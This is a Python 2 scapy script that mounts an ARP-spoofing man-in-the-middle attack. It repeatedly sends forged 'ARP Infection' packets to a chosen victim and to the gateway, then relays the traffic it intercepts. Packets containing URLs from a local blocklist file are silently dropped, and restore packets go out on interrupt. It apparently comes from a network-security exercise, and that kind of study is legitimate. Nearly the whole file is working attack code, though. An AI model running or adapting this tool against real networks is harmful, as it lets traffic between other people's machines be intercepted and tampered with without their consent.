import re
import sys
import netifaces
import thread
import time
import signal
from optparse import OptionParser
import scapy
from scapy.all import *
from multiprocessing import Pipe

targetIP = ""
targetMAC = ""
gatewayMAC = ""

pipeA, pipeB = Pipe()

def filter_url(url):
	return url.replace("https://", "").replace("http://", "")

f=open('./mal_site.txt', 'rb')
mal_url_list = [filter_url(url[:-1]) for url in f.readlines()]
f.close()



class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class InterfaceInformation():
	def __init__(self):
		self.myInterface = ""
		self.myMac = ""
		self.myIP = ""
		self.myGateway = ""

	def SetMyInterface(self, interface):
		self.myInterface = interface

	def UpdateInformation(self):
		try:
			interfaceInfo = netifaces.ifaddresses(self.myInterface)
		except:
			return False
		self.myMac = interfaceInfo[netifaces.AF_PACKET][0]['addr']
		self.myIP = interfaceInfo[netifaces.AF_INET][0]['addr']
		self.myGateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
		return True

	def GetMyMac(self):
		return self.myMac

	def GetMyIP(self):
		return self.myIP

	def GetMyGateway(self):
		return self.myGateway


def CheckOption(options, args):
	ipRegex = '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$'
	if options.interface == None or options.target == None:
		print "Usage: "+sys.argv[0]+' -i (interface) -t (target IP)'
		return False
		
	if bool(re.match(ipRegex, options.target)):
		return True
	else:
		print "Usage: "+sys.argv[0]+' -i (interface) -t (target IP)'
		return False

def arp_monitor_callback(pkt):
	global targetIP, pipeA
	if ARP in pkt and pkt[ARP].op in (2,):
		srcIP = pkt.sprintf("%ARP.psrc%")
		if srcIP == targetIP:
			pipeA.send(pkt.sprintf("%ARP.hwsrc%"))            #pipeA
			quit()
	else:
		pipeA.send('')

def arpSniff():
	sniff(prn=arp_monitor_callback, filter="arp", store=0)

def ARPrestore(signal, frame):
	print "\n"+bcolors.FAIL + '[*] Detect SIGINT interrupt' + bcolors.ENDC
        print bcolors.WARNING + '[*] Send ARP Restore Packet to ['+targetIP+']' + bcolors.ENDC
	VictimRestorePacket = Ether(src=myInfo.GetMyMac(), dst=targetMAC, type=2054)/ARP(pdst=targetIP, hwdst=targetMAC,  psrc=myInfo.GetMyGateway(), hwsrc=gatewayMAC, ptype=2048, hwtype=1,hwlen=6, plen=4, op=ARP.is_at)

        print bcolors.WARNING + '[*] Send ARP Restore Packet to ['+myInfo.GetMyGateway()+']' + bcolors.ENDC
	GatewayRestorePacket = Ether(src=myInfo.GetMyMac(), dst=gatewayMAC, type=2054)/ARP(pdst=myInfo.GetMyGateway(), hwdst=gatewayMAC,  psrc=targetIP, hwsrc=targetMAC, ptype=2048, hwtype=1,hwlen=6, plen=4, op=ARP.is_at)
	for i in range(3):
		sendp(VictimRestorePacket,  verbose=False)
		sendp(GatewayRestorePacket, verbose=False)
        sys.exit(0)

def SendInfectionARP(eth_src_mac, eth_dst_mac, arp_pdst, arp_hwdst, arp_psrc, arp_hwsrc):
	arpPacket = Ether(src=eth_src_mac, dst=eth_dst_mac, type=2054)/ARP(pdst=arp_pdst, hwdst=arp_hwdst,  psrc=arp_psrc, hwsrc=arp_hwsrc, ptype=2048, hwtype=1,hwlen=6, plen=4, op=ARP.is_at)
	
	while(1):
		sendp(arpPacket, verbose=False)					# Send ARP Infection Packet
		print bcolors.WARNING + "[*] Send ARP Infection Packet to  - ["+arp_pdst+"]"+ bcolors.ENDC
		time.sleep(1)

def RelayPacket(pkt):
	global targetMAC, gatewayMAC, targetIP

	#try:
	if pkt.haslayer(IP):
		if pkt.haslayer(UDP):
			del pkt[UDP].chksum
			del pkt[UDP].len
		elif pkt.haslayer(TCP):
			del pkt[TCP].chksum
		del pkt.chksum
		del pkt.len
		
		
		is_mal = False
		if pkt.haslayer(Raw):
			for url in mal_url_list:
				if url in pkt.getlayer(Raw).load:
					print url, pkt.getlayer(Raw).load
					is_mal = True
					break
		if not(is_mal):
			if pkt[Ether].src == targetMAC:
				pkt.src = myInfo.GetMyMac()
				pkt.dst = gatewayMAC
				frags=fragment(pkt,fragsize=1024)             # 1024 byte fragment
				for frag in frags:
					sendp(frag, verbose=False)

			elif pkt[IP].dst == targetIP and pkt.src == targetMAC:
				pkt.src = myInfo.GetMyMac()
				pkt.dst = targetMAC
				frags=fragment(pkt,fragsize=1024)             # 1024 byte fragment
				for frag in frags:
					sendp(frag, verbose=False)
	#except:
	#	print pkt.show()


def ForFowardPacketSniff():
	sniff(prn=RelayPacket, store=0)


if __name__ == "__main__":
	#------------------- argument filtering -------------------
	parser = OptionParser()
	parser.add_option("-i", "--interface", dest="interface", help="input interface")
	parser.add_option("-t", "--target", dest="target", help="input target IP")

	(options, args) = parser.parse_args()

	if CheckOption(options, args) == False:
		quit()

	myInfo = InterfaceInformation()
	myInfo.SetMyInterface(options.interface)

	if myInfo.UpdateInformation() == False:
		print "Error: Invalid Interface!"
		quit()

	#----------------------------------------------------------

	#------------------- Get Gate MAC Address -------------------


	thread.start_new_thread(arpSniff, ())              			# ARP Packet Sniffing

	targetIP = myInfo.GetMyGateway()                                      	# Target is Gateway
	arpPacket = Ether(src=myInfo.GetMyMac(), dst='ff:ff:ff:ff:ff:ff', type=2054)/ARP(hwdst='00:00:00:00:00:00', ptype=2048, hwtype=1, psrc=myInfo.GetMyIP(), hwlen=6, plen=4, pdst=targetIP, hwsrc=myInfo.GetMyMac(), op=ARP.who_has)
	#print ls(arpPacket)							# Get Target MAC Address Packet
	print bcolors.WARNING + "[*] ["+options.interface+"]Interface Gateway is ["+targetIP+"]" + bcolors.ENDC
	print bcolors.WARNING + "[*] Getting Gateway MAC Address to ARP Request ..."
	while gatewayMAC == "":
		sendp(arpPacket, verbose=False)                                 # Send Get Target MAC Address Packet
		gatewayMAC = pipeB.recv()                 			# pipeB
		time.sleep(1)
	print bcolors.OKGREEN + "[+] Sussess to Get Gateway MAC Address - ["+gatewayMAC+"]"+ bcolors.ENDC

	#----------------------------------------------------------


	thread.start_new_thread(arpSniff, ())              			# ARP Packet Sniffing


	#------------------- Get Target MAC Address -------------------
	targetIP = options.target						# Target is Victim
	arpPacket = Ether(src=myInfo.GetMyMac(), dst='ff:ff:ff:ff:ff:ff', type=2054)/ARP(pdst=targetIP, hwdst='00:00:00:00:00:00', psrc=myInfo.GetMyIP(), hwsrc=myInfo.GetMyMac(), ptype=2048, hwtype=1, hwlen=6, plen=4, op=ARP.who_has)
	#print ls(arpPacket)				  			# Get Target MAC Address Packet
	print bcolors.WARNING + "[*] Target is ["+targetIP+"]" + bcolors.ENDC
	print bcolors.WARNING + "[*] Getting Target MAC Address to ARP Request ..."
	while targetMAC == "":
		sendp(arpPacket, verbose=False)                                 # Send Get Target MAC Address Packet
		targetMAC = pipeB.recv()               				# pipeB
		time.sleep(1)
	print bcolors.OKGREEN + "[+] Sussess to Get Target MAC Address - ["+targetMAC+"]"+ bcolors.ENDC

	#----------------------------------------------------------
	signal.signal(signal.SIGINT, ARPrestore)

	thread.start_new_thread(SendInfectionARP, (myInfo.GetMyMac(), targetMAC, targetIP, targetMAC, myInfo.GetMyGateway(), myInfo.GetMyMac()))              			# Send to Victim, ARP Infection Packet 

	thread.start_new_thread(SendInfectionARP, (myInfo.GetMyMac(), gatewayMAC, myInfo.GetMyGateway(), gatewayMAC, targetIP, myInfo.GetMyMac()))              			# Send to Gateway, ARP Infection Packet 
	time.sleep(1)
	
	thread.start_new_thread(ForFowardPacketSniff, ())

	while True:
		time.sleep(10000)

	ARPrestore(signal.SIGINT, ARPrestore)













